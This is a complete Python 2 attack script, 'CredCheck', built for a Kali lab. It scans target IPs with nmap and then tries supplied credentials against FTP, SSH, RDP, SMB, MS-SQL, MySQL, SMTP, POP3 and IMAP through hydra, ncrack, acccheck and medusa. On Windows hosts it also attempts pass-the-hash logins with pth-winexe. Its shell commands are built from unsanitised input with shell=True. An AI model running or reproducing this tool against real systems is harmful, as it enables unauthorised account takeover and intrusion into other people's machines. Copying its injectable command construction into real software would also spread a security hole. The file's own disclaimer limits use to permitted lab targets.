#!/usr/bin/python

###################################################
#
#   CredCheck - written by Justin Ohneiser
# ------------------------------------------------
# Inspired by reconscan.py by Mike Czumak
#
# This program will check a set of credentials
# against a set of IP addresses looking for
# valid remote login access using two steps:
#   1. Light NMAP scan -> to identify services
#   2. Modular brute force for each service
#
# [Warning]:
# This script comes as-is with no promise of functionality or accuracy.  I strictly wrote it for personal use
# I have no plans to maintain updates, I did not write it to be efficient and in some cases you may find the
# functions may not produce the desired results so use at your own risk/discretion. I wrote this script to
# target machines in a lab environment so please only use it against systems for which you have permission!!
#-------------------------------------------------------------------------------------------------------------
# [Modification, Distribution, and Attribution]:
# You are free to modify and/or distribute this script as you wish.  I only ask that you maintain original
# author attribution and not attempt to sell it or incorporate it into any commercial offering (as if it's
# worth anything anyway :)
#
# Designed for use in Kali Linux 4.6.0-kali1-686
###################################################

import os, sys, subprocess

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

TIMECAP = 60

# ------------------------------------
#       Toolbox
# ------------------------------------

def printHeader():
    print ""
    print "###################################################"
    print "##   CredCheck"
    print "##"
    print "###################################################"
    print ""

def printUsage():
    print "Usage: \t%s <user:pass | userpass-file> <target | target-file>" % sys.argv[0].split("/")[len(sys.argv[0].split("/"))-1]

def printPlus(message):
    print bcolors.OKGREEN + "[+] " + message + bcolors.ENDC

def printMinus(message):
    print "[-] " + message

def printStd(message):
    print "[*] " + message

def printStdSpecial(message):
    print bcolors.WARNING + "[*] " + message + bcolors.ENDC

def printErr(message):
    print bcolors.FAIL + "[!] " + message + bcolors.ENDC

def printDbg(message):
    print bcolors.OKBLUE + "[-] " + message + bcolors.ENDC

def parseNmapScan(results):
    services = {}
    lines = results.split("\n")
    for line in lines:
        ports = []
        line = line.strip()
        if ("tcp" in line or "udp" in line) and ("open" in line) and not ("filtered" in line) and not ("Discovered" in line):
            while "  " in line:
                line = line.replace("  ", " ");
            linesplit = line.split(" ")
            service = linesplit[2]
            port = linesplit[0]
            if service in services:
                ports = services[service]
            ports.append(port)
            services[service] = ports
    return services

def dispatchModules(target, services, userpasses):
    for service in services:
        ports = services[service]
        if service in KNOWN_SERVICES:
            try:
                KNOWN_SERVICES[service](target, ports, userpasses)
            except AttributeError:
                printDbg("No module available for %s - %s" % (service, ports))
        else:
            printDbg("No module available for %s - %s" % (service, ports))

def validateIp(s):
    a = s.split('.')
    if len(a) != 4:
        return False
    for x in a:
        if not x.isdigit():
            return False
        i = int(x)
        if i < 0 or i > 255:
            return False
    return True

def validateUserpass(userpass):
    pieces = userpass.split(":")
    if not len(pieces) == 2:
        return False
    return True

def isWindows(target):
    NMAP = "nmap -p 445 --script smb-os-discovery %s | grep OS:" % target
    try:
        nmap_results = subprocess.check_output(NMAP, shell=True)
        if not "Windows" in nmap_results:
            printStd("Skipping: hash login not accessible")
            return False
    except KeyboardInterrupt:
        printMinus("Skipping:\n\t%s" % NMAP)
        return False
    except subprocess.CalledProcessError as ex:
        if ex.returncode != 1:
            raise Exception
        printStd("Skipping: hash login not accessible")
        return False
    except Exception as e:
        printErr("Unable to discover target compatibility:\n\t%s\n\n%s" % (NMAP, e))
        return False
    return True

# ------------------------------------
#       Scans
# ------------------------------------

# Light NMAP
# ========================
def conductLightNmap(target):
    printStdSpecial("Investigating %s" % target)
    NAME = "nmap_light"

    # Conduct Scan #
    TCPSCAN = "nmap %s" % target
    UDPSCAN = "nmap -sU -p 161 %s" % target
    tcpResults = ""
    udpResults = ""
    try:
        tcpResults = subprocess.check_output(TCPSCAN, shell=True)
        udpResults = subprocess.check_output(UDPSCAN, shell=True)
        print "%s" % tcpResults
    except KeyboardInterrupt:
        printMinus("Skipping:\n\t%s" % TCPSCAN)
    except Exception as e:
        printErr("Unable to conduct light nmap scan:\n\t%s\n\n%s" % (TCPSCAN, e))
        sys.exit(2)

    # Filter Results #
    services = parseNmapScan("%s\n%s" % (tcpResults, udpResults))

    return services
# ========================

# FTP
# ========================
def ftp(target, ports, userpasses):
    printStdSpecial("Checking FTP")

    for userpass in userpasses:
        HYDRA = "timeout %s hydra -l %s -p %s ftp://%s 2>&1" % (TIMECAP, userpass.split(":")[0], userpass.split(":")[1], target)
        try:
            hydraResults = subprocess.check_output(HYDRA, shell=True)
            if "valid password found" in hydraResults:
                for line in hydraResults.splitlines():
                    if "host" in line:
                        printPlus(line)
            else:
                printMinus(userpass)
        except KeyboardInterrupt:
            printMinus("Skipping:\n\t%s" % HYDRA)
            break
        except Exception:
            printErr("Unable to conduct FTP Brute:\n\t%s" % HYDRA)
# ========================

# SSH
# ========================
def ssh(target, ports, userpasses):
    printStdSpecial("Checking SSH")

    for userpass in userpasses:
        HYDRA = "timeout %s hydra -l %s -p %s ssh://%s -t 4 2>&1" % (TIMECAP, userpass.split(":")[0], userpass.split(":")[1], target)
        try:
            hydraResults = subprocess.check_output(HYDRA, shell=True)
            if "valid password found" in hydraResults:
                for line in hydraResults.splitlines():
                    if "host" in line:
                        printPlus(line)
            else:
                printMinus(userpass)
        except KeyboardInterrupt:
            printMinus("Skipping:\n\t%s" % HYDRA)
            break
        except Exception:
            printErr("Unable to conduct SSH Brute:\n\t%s" % HYDRA)
# ========================

# RDP
# ========================
def rdp(target, ports, userpasses):
    printStdSpecial("Checking RDP")

    for userpass in userpasses:
        NCRACK = "timeout %i ncrack -vv --user %s --pass %s rdp://%s" % (TIMECAP, userpass.split(":")[0], userpass.split(":")[1], target)
        NCRACK_SSL = "%s -g ssl=yes" % NCRACK
        try:
            ncrackResults = "%s%s" % (subprocess.check_output(NCRACK, shell=True), subprocess.check_output(NCRACK_SSL, shell=True))
            if "Discovered credentials" in ncrackResults:
                printPlus(userpass)
            else:
                printMinus(userpass)
        except KeyboardInterrupt:
            printMinus("Skipping:\n\t%s" % NCRACK)
            break
        except Exception:
            printErr("Unable to conduct RDP Brute:\n\t%s" % NCRACK)
# ========================

# SMB
# ========================
def smb(target, ports, userpasses):
    printStdSpecial("Checking SMB")

    for userpass in userpasses:
        ACCCHECK = "timeout %i acccheck -t %s -u %s -p %s -v" % (TIMECAP, target, userpass.split(":")[0], userpass.split(":")[1])

        try:
            acccheck_results = subprocess.check_output(ACCCHECK, shell=True)
            if "SUCCESS" in acccheck_results:
                printPlus(userpass)
            else:
                printMinus(userpass)
        except KeyboardInterrupt:
            printMinus("Skipping:\n\t%s" % ACCCHECK)
            break
        except Exception:
            printErr("Unable to conduct SMB brute:\n\t%s" % ACCCHECK)

    if not isWindows(target):
        return

    printStd("Checking Pass the Hash")

    for userpass in userpasses:
        WINEXE = "timeout %i pth-winexe -U %s%%%s --uninstall //%s whoami 2>&1" % (TIMECAP, userpass.split(":")[0], userpass.split(":")[1], target)

        try:
            winexe_results = subprocess.check_output(WINEXE, shell=True)
            if not "ERROR" in winexe_results:
                printPlus("pth-winexe -U %s%%%s --uninstall //%s cmd" % (userpass.split(":")[0], userpass.split(":")[1], target))
            else:
                printMinus(userpass)
        except KeyboardInterrupt:
            printMinus("Skipping:\n\t%s" % WINEXE)
            break
        except Exception:
            printErr("Unable to conduct PTH brute:\n\t%s" % WINEXE)
# ========================

# MSSQL
# ========================
def ms_sql(target, ports, userpasses):
    printStdSpecial("Checking MS-SQL")

    for userpass in userpasses:
        MEDUSA = "timeout %i medusa -h %s -u %s -p %s -M mssql -L -f 2>&1" % (TIMECAP, target, userpass.split(":")[0], userpass.split(":")[1])

        try:
            medusa_results = subprocess.check_output(MEDUSA, shell=True)
            if "ACCOUNT FOUND" in medusa_results:
                printPlus(userpass)
            else:
                printMinus(userpass)
        except KeyboardInterrupt:
            printMinus("Skipping:\n\t%s" % MEDUSA)
            break
        except Exception:
            printErr("Unable to conduct MS-SQL brute:\n\t%s" % MEDUSA)
# ========================

# MySQL
# ========================
def mysql(target, ports, userpasses):
    printStdSpecial("Checking MySQL")

    for userpass in userpasses:
        MEDUSA = "timeout %i medusa -h %s -u %s -p %s -M mysql -L -f 2>&1" % (TIMECAP, target, userpass.split(":")[0], userpass.split(":")[1])

        try:
            medusa_results = subprocess.check_output(MEDUSA, shell=True)
            if "ACCOUNT FOUND" in medusa_results:
                printPlus(userpass)
            else:
                printMinus(userpass)
        except KeyboardInterrupt:
            printMinus("Skipping:\n\t%s" % MEDUSA)
            break
        except Exception:
            printErr("Unable to conduct MySQL brute:\n\t%s" % MEDUSA)
# ========================

# SMTP
# ========================
def smtp(target, ports, userpasses):
    printStdSpecial("Checking SMTP")

    for userpass in userpasses:
        HYDRA = "timeout %i hydra -l %s -p %s smtp://%s 2>&1" % (TIMECAP, userpass.split(":")[0], userpass.split(":")[1], target)

        try:
            hydra_results = subprocess.check_output(HYDRA, shell=True)
            if "valid password found" in hydra_results:
                for line in hydra_results.splitlines():
                    if "host" in line:
                        printPlus(line)
            else:
                printMinus(userpass)
        except KeyboardInterrupt:
            printMinus("Skipping:\n\t%s" % HYDRA)
            break
        except Exception:
            printErr("Unable to conduct SMTP brute:\n\t%s" % HYDRA)
# ========================

# POP3
# ========================
def pop3(target, ports, userpasses):
    printStdSpecial("Checking POP3")

    for userpass in userpasses:
        HYDRA = "timeout %i hydra -l %s -p %s pop3://%s 2>&1" % (TIMECAP, userpass.split(":")[0], userpass.split(":")[1], target)

        try:
            hydra_results = subprocess.check_output(HYDRA, shell=True)
            if "valid password found" in hydra_results:
                for line in hydra_results.splitlines():
                    if "host" in line:
                        printPlus(line)
            else:
                printMinus(userpass)
        except KeyboardInterrupt:
            printMinus("Skipping:\n\t%s" % HYDRA)
            break
        except Exception:
            printErr("Unable to conduct POP3 brute:\n\t%s" % HYDRA)
# ========================

# IMAP
# ========================
def imap(target, ports, userpasses):
    printStdSpecial("Checking imap")

    for userpass in userpasses:
        HYDRA = "timeout %i hydra -l %s -p %s imap://%s 2>&1" % (TIMECAP, userpass.split(":")[0], userpass.split(":")[1], target)

        try:
            hydra_results = subprocess.check_output(HYDRA, shell=True)
            if "valid password found" in hydra_results:
                for line in hydra_results.splitlines():
                    if "host" in line:
                        printPlus(line)
            else:
                printMinus(userpass)
        except KeyboardInterrupt:
            printMinus("Skipping:\n\t%s" % HYDRA)
            break
        except Exception:
            printErr("Unable to conduct IMAP brute:\n\t%s" % HYDRA)
# ========================

# ------------------------------------
#       Main
# ------------------------------------

KNOWN_SERVICES = {
    "ftp"           :   ftp,
    "ssh"           :   ssh,
    "ms-wbt-server" :   rdp,
    "netbios-ssn"   :   smb,
    "ms-sql-s"      :   ms_sql,
    "mysql"         :   mysql,
    "smtp"          :   smtp,
    "pop3"          :   pop3,
    "imap"          :   imap
}

def main(argv):
    if len(sys.argv) != 3:
        printUsage()
        sys.exit(2)

    # Validate Userpasses

    USERPASSES = []
    if os.path.isfile(sys.argv[1]):
        with open(sys.argv[1]) as f:
            for line in f:
                if not validateUserpass(line.strip()):
                    printErr("Invalid userpass format: %s" % line.strip())
                    continue
                USERPASSES.append(line.strip())
    else:
        if not validateUserpass(sys.argv[1]):
            printErr("Invalid userpass format: %s" % sys.argv[1])
            printUsage()
            sys.exit(2)
        USERPASSES = [sys.argv[1]]

    # Validate Targets

    TARGETS = []
    if os.path.isfile(sys.argv[2]):
        with open(sys.argv[2]) as f:
            for line in f:
                if not validateIp(line.strip()):
                    printErr("Invalid target format: %s" % line.strip())
                    continue
                TARGETS.append(line.strip())
    else:
        if not validateIp(sys.argv[2]):
            printErr("Invalid target format: %s" % sys.argv[2])
            printUsage()
            sys.exit(2)
        TARGETS = [sys.argv[2]]

    # Begin

    printHeader()

    try:
        for target in TARGETS:
            SERVICES = conductLightNmap(target)
            dispatchModules(target, SERVICES, USERPASSES)
    except KeyboardInterrupt:
        print "\n\nExiting.\n"
        sys.exit(1)

if __name__ == "__main__":
    main(sys.argv[1:])
